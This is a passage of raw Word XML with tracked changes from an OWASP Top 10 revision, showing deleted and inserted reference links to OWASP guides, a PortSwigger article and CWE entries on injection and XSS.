    <w:p w14:paraId="5BF80824" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1438" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1439" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Proactive Controls: Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="555D25CB" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1440" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1441" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Proactive Controls: Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="717FB8FB" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1442" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1443" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Application Security Verification Standard: V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4BE86606" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1444" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1445" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2D9EE34D" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1446" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1447" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4382C2C3" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1448" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1449" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0A7678C0" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1450" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1451" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Cheat Sheet: XSS Prevention](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7E032348" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1452" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1453" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Cheat Sheet: DOM based XSS Prevention](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="596D7093" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1454" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1455" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Cheat Sheet: XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="56849523" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1456" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1457" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Java Encoder Project](https://www.owasp.org/index.php/OWASP_Java_Encoder_Project)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="375A4279" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1458" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CB4DEDF" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1459" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1460" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="61D6CC5A" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1461" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="086A9382" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1462" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1463" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>* [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7BA98A89" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1464" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1465" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="32349F55" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1466" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1467" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-564: Hibernate Injection](https://cwe.mitre.org/data/definitions/564.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="27D15992" w14:textId="77777777" w:rsidR="003A6212" w:rsidRPr="003A6212" w:rsidRDefault="003A6212" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1468" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1469" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="198F3F77" w14:textId="542C028F" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="003A6212" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1470" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> [</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PortSwigger</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">: Server-side template </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>injection](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://portswigger.net/kb/issues/00101080_serversidetemplateinjection)</w:t>
      </w:r>
      <w:del w:id="1471" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:br/>
        </w:r>
        <w:r w:rsidRPr="003A6212">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText># A7:2017 Cross-Site Scripting (XSS)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1472" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="376B1BCA" w14:textId="77777777" w:rsidR="00225B64" w:rsidRPr="00225B64" w:rsidRDefault="00225B64" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1473" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1474" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00225B64">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2315E72E" w14:textId="77777777" w:rsidR="00225B64" w:rsidRPr="00225B64" w:rsidRDefault="00225B64" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="1475" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="278274B3" w14:textId="1A529E8A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00225B64" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1476" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="1477" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00225B64">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [CWE-79: Improper neutralization</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="52C3C0E8" w14:textId="6E98CAE7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1478" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1479" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## List</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of </w:t>
      </w:r>
      <w:del w:id="1480" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00225B64" w:rsidRPr="00225B64">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>user supplied input</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1481" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Mapped CWEs </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".mapped </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", id=id ~ "-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>mapped_cwes</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", name=title ~ ": List of Mapped CWEs", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3ACC61DE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1482" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DD35677" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1483" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1484" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-20: Improper Input </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Validation</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://cwe.mitre.org/data/definitions/</w:t>
      </w:r>
      <w:ins w:id="1485" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">20.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3FA904BF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1486" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1487" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component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https://cwe.mitre.org/data/definitions/74.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5227F458" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="1488" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1489" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [CWE-75: Failure to Sanitize Special Elements into a Different Plane (Special Element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https://cwe.mitre.org/data/definitions/75.html)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="61D5AF74" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
